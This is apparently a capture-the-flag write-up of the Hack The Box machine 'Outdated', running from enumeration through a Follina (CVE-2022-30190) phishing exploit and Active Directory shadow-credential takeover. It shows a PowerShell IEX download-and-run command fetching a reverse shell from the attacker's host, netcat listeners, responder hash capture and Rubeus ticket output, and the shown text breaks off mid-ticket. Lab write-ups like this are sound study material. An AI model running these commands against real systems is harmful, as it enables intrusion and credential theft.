![image](https://user-images.githubusercontent.com/87700008/208471850-0dddee32-e47e-4f13-a15e-f8a26ce60f06.png)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
**Enumeration:**

Port scan :

Started with a quck rustscan:

    sudo rustscan -a 10.10.11.175 -- -sC -sV -T4 -vv -oN outdated_nmap
    
I found multiple open ports & services running :

    `# Nmap 7.91 scan initiated Tue Dec 13 14:06:11 2022 as: nmap -vvv -p 25,53,88,135,139,389,445,464,593,636,3268,5985,8531,8530,9389,49667,49685,49686,49689,49906,59072,59080 -sC -sV -T4 -vv -oN outdated_nmap 10.10.11.175
Nmap scan report for 10.10.11.175
    Host is up, received echo-reply ttl 127 (0.11s latency).
    Scanned at 2022-12-13 14:06:13 EST for 105s
    
    PORT      STATE SERVICE       REASON          VERSION
    25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd
    | smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP, 
    |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
    53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
    88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-12-14 03:06:26Z)
    135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
    389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: 
    | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
    | Issuer: commonName=outdated-DC-CA/domainComponent=outdated
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2022-06-18T05:50:24
    | Not valid after:  2024-06-18T06:00:24
    | MD5:   ddf3 d13d 3a6a 3fa0 1dee 8321 6784 83dc
    | SHA-1: 7544 3aee ffbc 2ea7 bf61 1380 0a6c 16f1 cd07 afce
    | -----BEGIN CERTIFICATE-----
    | MIIFpDCCBIygAwIBAgITHQAAAAO0Hc53pH72GAAAAAAAAzANBgkqhkiG9w0BAQsF
    | ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIb3V0ZGF0
    | ZWQxFzAVBgNVBAMTDm91dGRhdGVkLURDLUNBMB4XDTIyMDYxODA1NTAyNFoXDTI0
    | MDYxODA2MDAyNFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALE6
    | oXztlMZYhET3e+DVQAJYB52HQHQnklGuIC5cIeoxbR4WiwfWXRhIpfNEo/1IXSs2
    | xk4jOJpYOklg4PwfdHxhrS06+wSto7MgSksULWwjm0b7llqixKxo3o+PgVYOgQtN
    | 7T6Mpxo153Q1gAVI0u6WpSYcSTBSMh//0anXX+2jPT5KNkoq7Ck3e4Nhjb44XFIT
    | KG1xC+EbiwbcMxhW6+ufGIu3bINYQudykPSS8zClFmFWH9KnBvrpNDYdFye+6iz6
    | AFMcjmzy1Ezwec/3pP1EutaZHf1pTCJ+ec7O3mISNQ19hPaI3pMcgGzpUEPvpWfj
    | HzPymRPVfGof6KGSjq0CAwEAAaOCAs0wggLJMDsGCSsGAQQBgjcVBwQuMCwGJCsG
    | AQQBgjcVCIT9zQLE9DP5hROD9rYjhd3sS0OD/9Y6hYyCKwIBZAIBAjAyBgNVHSUE
    | KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
    | VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
    | AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBSsuFEFtUSl
    | l20qj0JnZQ99CDj4UDAfBgNVHSMEGDAWgBQqRfR/8VopV8PGTe6GJT0dbv5UtjCB
    | yAYDVR0fBIHAMIG9MIG6oIG3oIG0hoGxbGRhcDovLy9DTj1vdXRkYXRlZC1EQy1D
    | QSxDTj1EQyxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vy
    | dmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1vdXRkYXRlZCxEQz1odGI/Y2VydGlm
    | aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
    | dGlvblBvaW50MIHBBggrBgEFBQcBAQSBtDCBsTCBrgYIKwYBBQUHMAKGgaFsZGFw
    | Oi8vL0NOPW91dGRhdGVkLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
    | ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW91dGRhdGVk
    | LERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
    | dGlvbkF1dGhvcml0eTA1BgNVHREBAf8EKzApgg9EQy5vdXRkYXRlZC5odGKCDG91
    | dGRhdGVkLmh0YoIIT1VUREFURUQwDQYJKoZIhvcNAQELBQADggEBAA4fLq61cFEC
    | gv9/iMwPO02NC0SbPNHquvsIdEwkqEvx+hr6hfvmv3UTyQXgZQSIZDoaZWxR/47l
    | JDQjF45v9O0rYKvYKLh/tOpCaxY2cF1RcRJiO2Vbg/RtKB/dd022srF+u2nBuvO0
    | VgxHlsiP+tHvY8zX9JBVMMQLjx8Uf9yPkxO7rNwNHyeh5PKtcUrqNRQc8n0Pqg6K
    | Mc320ONyncAW7RPAdVd3zhLsHEzBtGtZgmc8QXKNsxdxbdmDbiCRQFsCKLku3m7M
    | vtnc2e0fgjcVmBmJqQVOdptMb7L80UtN8mYkjMkvdeCO2QrAoAir1J8osZo7TWpL
    | E2BaNXsDGeo=
    |_-----END CERTIFICATE-----
    |_ssl-date: 2022-12-14T03:07:57+00:00; +8h00m01s from scanner time.
    445/tcp   open  microsoft-ds? syn-ack ttl 127
    464/tcp   open  kpasswd5?     syn-ack ttl 127
    593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: 
    | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
    | Issuer: commonName=outdated-DC-CA/domainComponent=outdated
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2022-06-18T05:50:24
    | Not valid after:  2024-06-18T06:00:24
    | MD5:   ddf3 d13d 3a6a 3fa0 1dee 8321 6784 83dc
    | SHA-1: 7544 3aee ffbc 2ea7 bf61 1380 0a6c 16f1 cd07 afce
    | -----BEGIN CERTIFICATE-----
    | MIIFpDCCBIygAwIBAgITHQAAAAO0Hc53pH72GAAAAAAAAzANBgkqhkiG9w0BAQsF
    | ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIb3V0ZGF0
    | ZWQxFzAVBgNVBAMTDm91dGRhdGVkLURDLUNBMB4XDTIyMDYxODA1NTAyNFoXDTI0
    | MDYxODA2MDAyNFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALE6
    | oXztlMZYhET3e+DVQAJYB52HQHQnklGuIC5cIeoxbR4WiwfWXRhIpfNEo/1IXSs2
    | xk4jOJpYOklg4PwfdHxhrS06+wSto7MgSksULWwjm0b7llqixKxo3o+PgVYOgQtN
    | 7T6Mpxo153Q1gAVI0u6WpSYcSTBSMh//0anXX+2jPT5KNkoq7Ck3e4Nhjb44XFIT
    | KG1xC+EbiwbcMxhW6+ufGIu3bINYQudykPSS8zClFmFWH9KnBvrpNDYdFye+6iz6
    | AFMcjmzy1Ezwec/3pP1EutaZHf1pTCJ+ec7O3mISNQ19hPaI3pMcgGzpUEPvpWfj
    | HzPymRPVfGof6KGSjq0CAwEAAaOCAs0wggLJMDsGCSsGAQQBgjcVBwQuMCwGJCsG
    | AQQBgjcVCIT9zQLE9DP5hROD9rYjhd3sS0OD/9Y6hYyCKwIBZAIBAjAyBgNVHSUE
    | KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
    | VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
    | AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBSsuFEFtUSl
    | l20qj0JnZQ99CDj4UDAfBgNVHSMEGDAWgBQqRfR/8VopV8PGTe6GJT0dbv5UtjCB
    | yAYDVR0fBIHAMIG9MIG6oIG3oIG0hoGxbGRhcDovLy9DTj1vdXRkYXRlZC1EQy1D
    | QSxDTj1EQyxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vy
    | dmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1vdXRkYXRlZCxEQz1odGI/Y2VydGlm
    | aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
    | dGlvblBvaW50MIHBBggrBgEFBQcBAQSBtDCBsTCBrgYIKwYBBQUHMAKGgaFsZGFw
    | Oi8vL0NOPW91dGRhdGVkLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
    | ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW91dGRhdGVk
    | LERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
    | dGlvbkF1dGhvcml0eTA1BgNVHREBAf8EKzApgg9EQy5vdXRkYXRlZC5odGKCDG91
    | dGRhdGVkLmh0YoIIT1VUREFURUQwDQYJKoZIhvcNAQELBQADggEBAA4fLq61cFEC
    | gv9/iMwPO02NC0SbPNHquvsIdEwkqEvx+hr6hfvmv3UTyQXgZQSIZDoaZWxR/47l
    | JDQjF45v9O0rYKvYKLh/tOpCaxY2cF1RcRJiO2Vbg/RtKB/dd022srF+u2nBuvO0
    | VgxHlsiP+tHvY8zX9JBVMMQLjx8Uf9yPkxO7rNwNHyeh5PKtcUrqNRQc8n0Pqg6K
    | Mc320ONyncAW7RPAdVd3zhLsHEzBtGtZgmc8QXKNsxdxbdmDbiCRQFsCKLku3m7M
    | vtnc2e0fgjcVmBmJqQVOdptMb7L80UtN8mYkjMkvdeCO2QrAoAir1J8osZo7TWpL
    | E2BaNXsDGeo=
    |_-----END CERTIFICATE-----
    |_ssl-date: 2022-12-14T03:07:58+00:00; +8h00m01s from scanner time.
    3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: 
    | Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
    | Issuer: commonName=outdated-DC-CA/domainComponent=outdated
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2022-06-18T05:50:24
    | Not valid after:  2024-06-18T06:00:24
    | MD5:   ddf3 d13d 3a6a 3fa0 1dee 8321 6784 83dc
    | SHA-1: 7544 3aee ffbc 2ea7 bf61 1380 0a6c 16f1 cd07 afce
    | -----BEGIN CERTIFICATE-----
    | MIIFpDCCBIygAwIBAgITHQAAAAO0Hc53pH72GAAAAAAAAzANBgkqhkiG9w0BAQsF
    | ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIb3V0ZGF0
    | ZWQxFzAVBgNVBAMTDm91dGRhdGVkLURDLUNBMB4XDTIyMDYxODA1NTAyNFoXDTI0
    | MDYxODA2MDAyNFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALE6
    | oXztlMZYhET3e+DVQAJYB52HQHQnklGuIC5cIeoxbR4WiwfWXRhIpfNEo/1IXSs2
    | xk4jOJpYOklg4PwfdHxhrS06+wSto7MgSksULWwjm0b7llqixKxo3o+PgVYOgQtN
    | 7T6Mpxo153Q1gAVI0u6WpSYcSTBSMh//0anXX+2jPT5KNkoq7Ck3e4Nhjb44XFIT
    | KG1xC+EbiwbcMxhW6+ufGIu3bINYQudykPSS8zClFmFWH9KnBvrpNDYdFye+6iz6
    | AFMcjmzy1Ezwec/3pP1EutaZHf1pTCJ+ec7O3mISNQ19hPaI3pMcgGzpUEPvpWfj
    | HzPymRPVfGof6KGSjq0CAwEAAaOCAs0wggLJMDsGCSsGAQQBgjcVBwQuMCwGJCsG
    | AQQBgjcVCIT9zQLE9DP5hROD9rYjhd3sS0OD/9Y6hYyCKwIBZAIBAjAyBgNVHSUE
    | KzApBgcrBgEFAgMFBgorBgEEAYI3FAICBggrBgEFBQcDAQYIKwYBBQUHAwIwDgYD
    | VR0PAQH/BAQDAgWgMEAGCSsGAQQBgjcVCgQzMDEwCQYHKwYBBQIDBTAMBgorBgEE
    | AYI3FAICMAoGCCsGAQUFBwMBMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBSsuFEFtUSl
    | l20qj0JnZQ99CDj4UDAfBgNVHSMEGDAWgBQqRfR/8VopV8PGTe6GJT0dbv5UtjCB
    | yAYDVR0fBIHAMIG9MIG6oIG3oIG0hoGxbGRhcDovLy9DTj1vdXRkYXRlZC1EQy1D
    | QSxDTj1EQyxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2Vy
    | dmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1vdXRkYXRlZCxEQz1odGI/Y2VydGlm
    | aWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1
    | dGlvblBvaW50MIHBBggrBgEFBQcBAQSBtDCBsTCBrgYIKwYBBQUHMAKGgaFsZGFw
    | Oi8vL0NOPW91dGRhdGVkLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
    | ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW91dGRhdGVk
    | LERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
    | dGlvbkF1dGhvcml0eTA1BgNVHREBAf8EKzApgg9EQy5vdXRkYXRlZC5odGKCDG91
    | dGRhdGVkLmh0YoIIT1VUREFURUQwDQYJKoZIhvcNAQELBQADggEBAA4fLq61cFEC
    | gv9/iMwPO02NC0SbPNHquvsIdEwkqEvx+hr6hfvmv3UTyQXgZQSIZDoaZWxR/47l
    | JDQjF45v9O0rYKvYKLh/tOpCaxY2cF1RcRJiO2Vbg/RtKB/dd022srF+u2nBuvO0
    | VgxHlsiP+tHvY8zX9JBVMMQLjx8Uf9yPkxO7rNwNHyeh5PKtcUrqNRQc8n0Pqg6K
    | Mc320ONyncAW7RPAdVd3zhLsHEzBtGtZgmc8QXKNsxdxbdmDbiCRQFsCKLku3m7M
    | vtnc2e0fgjcVmBmJqQVOdptMb7L80UtN8mYkjMkvdeCO2QrAoAir1J8osZo7TWpL
    | E2BaNXsDGeo=
    |_-----END CERTIFICATE-----
    |_ssl-date: 2022-12-14T03:07:57+00:00; +8h00m01s from scanner time.
    5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    8530/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
    | http-methods: 
    |   Supported Methods: OPTIONS TRACE GET HEAD POST
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Site doesn't have a title.
    8531/tcp  open  unknown       syn-ack ttl 127
    9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
    49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49685/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
    49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49906/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    59072/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    59080/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
    | p2p-conficker: 
    |   Checking for Conficker.C or higher...
    |   Check 1 (port 38272/tcp): CLEAN (Timeout)
    |   Check 2 (port 13460/tcp): CLEAN (Timeout)
    |   Check 3 (port 64661/udp): CLEAN (Timeout)
    |   Check 4 (port 48887/udp): CLEAN (Timeout)
    |_  0/4 checks are positive: Host is CLEAN or ports are blocked
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2022-12-14T03:07:18
    |_  start_date: N/A`
    
Found 3 domians in the nmap scan & added all of them to the /etc/hosts config file:

    - outdated.htb 
    - DC.outdated.htb 
    - mail.outdated.htb

**Dns**:

Digged into the DNS info for the domain & got another new domain in the DNS, added this new host into the host config :

    dig outdated.htb any @10.10.11.175
    
    hostmaster.outdated.htb
    
![image](https://user-images.githubusercontent.com/87700008/208476656-c634f869-69d1-4c44-8b61-c3b83dfde6a5.png)


Tried to gather more info from the LDAP as port 389 is open but no luck there as well, seems like we need to authenticate before connecting to the device:

![image](https://user-images.githubusercontent.com/87700008/208480500-3330f4c4-063a-4761-85a9-fed3ebec4135.png)


SMB share enumeration:

Started with the SMB scanning as the port 445 is open. Tried to check for the openshare with null user but seems like it isn't taking the user as null:

![image](https://user-images.githubusercontent.com/87700008/208481716-43d5c78a-6bce-44ce-b99b-0db54b2ccf9e.png)

Supplied the same command with some random user this time & got the share list :

      smbmap -u DoesNotExist -H outdated.htb
![image](https://user-images.githubusercontent.com/87700008/208481973-a4423d4a-24e7-4381-97c6-6f94ae5deb46.png)

We are only having access for these 2 shared :

    IPC$
    Shares
    
![image](https://user-images.githubusercontent.com/87700008/208482631-85d1f67e-9c97-459a-9691-985047e39c30.png)

Tried to connect & enumerate some more into the shares, started with "IPC$" but unable to list any of the files:

        smbclient \\\\outdated.htb\\IPC$ -U "DoesNotExist"
        
![image](https://user-images.githubusercontent.com/87700008/208488792-c9d664ae-4ffb-4d9c-8f0e-ddee452265fb.png)

Then I connect to the other "share" and found 1 pdf file in it "NOC_Reminder.pdf" :

        smbclient \\\\outdated.htb\\Shares -U "DoesNotExist"
        
![image](https://user-images.githubusercontent.com/87700008/208489249-e411e29f-37ca-41f7-b8ec-8464fb82fa37.png)

Check for the file content in the PDF & observed there is an account "itsupport@outdated.htb" mentioned to contact for the windows update.

![image](https://user-images.githubusercontent.com/87700008/208490980-8db1dcc7-2dfd-4c4d-a101-8ccdf8193c6c.png)

Ran Kerbrute & found 3 other valid usernames as well:

![image](https://user-images.githubusercontent.com/87700008/208497771-57a5c58b-cd34-4192-8df2-e9adca6728f1.png)

With the gathered credentials I tried to gather some hashes via using AS-REP roasting without using any password but no luch here as well :

        python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.11.175 -request 'dc.outdated.htb/' -no-pass -usersfile user_list.txt
        
![image](https://user-images.githubusercontent.com/87700008/208656855-ca0bcb76-dac3-45b2-b2f9-d0b6e4b633f9.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Initial access:**

As I tried all the possible ways but didn't get the success now it's time to go with the hint provided in that PDF file. As per the list of vulnerabilities we will try to exploit MSDT exploit CVE-2022-30190 (follina). Also, from port scan I found port 25 open & running a SMTP server & from the pdf "please assist our NOC by e-mailing a link to any internal web applications to
itsupport@outdated.htb so we can get them added back into our monitoring platform for alerts and notifications" it seems like we can exploit this follina vulnerabiliy.

At this point I am clueless how to proceed further but then I took some help from the Ippsec video & got know about a tool called "swaks". In short it is a SMTP transaction tester. 

![image](https://user-images.githubusercontent.com/87700008/208659001-aa361b97-6774-46ad-ac94-272914a3defa.png)

So, we can use swaks to send an e-mail towards itsupport & we can check for the response while our ncat server running, so the format to send e-mail from swaks will be something like this :

        swaks --to itsupport@outdated.htb --from "k4rim@0k4rim.htb" --server mail.outdated.htb --header "Subject: Internal web app" --body "http://myip"
        
 And in our ncat we got response from the box & it seems like the server is running the powershell :
 
 ![image](https://user-images.githubusercontent.com/87700008/208740200-2e609767-0c5a-4f7b-9f65-eb8d1c248e32.png)
 
 Now, to exploit the follina vulnerability we can follow these steps :
 
 - Host a html page with more than 4096 bytes to exploit the follina vulnerability.
 - In that html page contain another "IEX" command to retrieve our shell which is beign hosted in the same directory.
 - shell contains a code which will give us a reverse shell.

So, to for the exploitation with 4096 bytes of padded data I used POC from here : https://github.com/chvancooten/follina.py
With the help of follina.py I generated an HTML page with the exploit that well get executed on the box :

        python3 follina.py -m command -t rtf -c "IEX(New-Object Net.WebClient).downloadString('http://myip/shell.ps1')"

![image](https://user-images.githubusercontent.com/87700008/208747329-5db475c3-18f3-476a-8f8d-2ee73f317a7e.png)

This generated an HTML page contains another url with my payload, look like this :
![image](https://user-images.githubusercontent.com/87700008/208747624-f94eda45-de6e-4132-bf61-3a4cecee937a.png)

To get a stable reverse shell I used this ps1 script : https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
Copied the script & pasted into a new file "shell.ps1" & as per the repository to establish the shell I added this line at the end of script:

        Invoke-ConPtyShell myIp port
        
![image](https://user-images.githubusercontent.com/87700008/208748561-2d8fb37b-29e0-4e40-b99c-ce64926116cf.png)

And after that in the other terminal window I ran this to catch the stablize shell :

        stty raw -echo; (stty size; cat) | nc -lvnp port
        
Then using swaks I again send the e-mail to the server pointing to the "/exploit.html" this time & got the reverse shell as user "btables". (pwn3d!🙂)

        swaks --to itsupport@outdated.htb --from "k4rim@0k4rim.com" --server mail.outdated.htb --header "Subject: Internal web app" --body "http://myip/exploit.html"
        
![image](https://user-images.githubusercontent.com/87700008/208749146-8a21362a-2e59-4d00-8fc8-dcd07f03e9ae.png)
![image](https://user-images.githubusercontent.com/87700008/208749360-0faa1627-c25d-487f-81da-38b4a195ef1b.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

**User flag:**

When checked into the desktop of the current user, didn't found the user flag in it. Also, checked the other folders as well but didn't got the flag anywhere as well. 😕

![image](https://user-images.githubusercontent.com/87700008/208750566-a74e0c6b-a474-403d-81e0-71327916ce1c.png)

I started checking for the system info & found that we are in a HyperVisor environment & there is another subnet of IP is present in the machine starting from 172.X

![image](https://user-images.githubusercontent.com/87700008/208755285-fe42e7b5-4a07-47e3-9da3-a458d1973343.png)

So, Here I just ran responder in my kali box & started listening with the responder & in the user terminal I ran command to get file from my hosted share path:

        sudo responder -I tun0 -dwv
        
I grabbed the user hash which I may use further :

![image](https://user-images.githubusercontent.com/87700008/208752711-c94546df-9fdd-41c2-b182-fc319c93b481.png)

Next I executed sharphound which is transferred from my local kali machine, to get the AD network map.

        sharphound.exe -c all

![image](https://user-images.githubusercontent.com/87700008/208756198-5f5ddbcf-f10b-4970-b22f-970eeedde356.png)

Moved the sharphound collected zip folder back to my kali machine & dropped it in my bloodhound, without any error it got uploaded successfully :

![image](https://user-images.githubusercontent.com/87700008/208756358-1f50b3cf-9b8f-4360-80bd-8112429a667b.png)

As per my usual approach I always search & mark the user as owned to get the shortest path for domain admin via owned principals.

![image](https://user-images.githubusercontent.com/87700008/208756845-ff7ee45c-e5ad-4c14-882a-188db88bdc4e.png)

Next from the bloodhound I chose the option to show "shortest path from owned principals" & got this :

![image](https://user-images.githubusercontent.com/87700008/208760601-f87b9562-9346-4c8c-8e41-6f4d38e66836.png)

This show that our owned user is a member of ITSTAFF group & the members of the group ITSTAFF@OUTDATED.HTB have the ability to write to the "msds-KeyCredentialLink" property on SFLOWERS@OUTDATED.HTB. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT.

![image](https://user-images.githubusercontent.com/87700008/208760881-a7fe2cd4-750d-4fd4-bc92-e031c2c8f337.png)
![image](https://user-images.githubusercontent.com/87700008/208760918-4202b6f3-dedc-43e1-9c10-cd9b2c332191.png)

So, whisker is a tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute, effectively adding "Shadow Credentials" to the target account.

We will use Whisker powershell script to get the job done as per the bloodhound abuse info. Whisker ps repo : https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1

Moved the script into the box & invoked the whisper script then used the similar command which was shown in bloodhound, this gives us a Rubeus key to get into the "sflowers" account.

        Invoke-Whisker -command "add /target:sflowers"
        
![image](https://user-images.githubusercontent.com/87700008/208775012-3c6f1f15-fa55-4558-967b-f136c2a70743.png)

Ran this key & got the "sflowe" NTLM hash :

           ______        _
          (_____ \      | |                     
           _____) )_   _| |__  _____ _   _  ___
          |  __  /| | | |  _ \| ___ | | | |/___)
          | |  \ \| |_| | |_) ) ____| |_| |___ |
          |_|   |_|____/|____/|_____)____/(___/
        
          v2.2.0
        
        [*] Action: Ask TGT
        
        [*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
        [*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
        [*] Using domain controller: 172.16.20.1:88
        [+] TGT request successful!
        [*] base64(ticket.kirbi):
        
              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
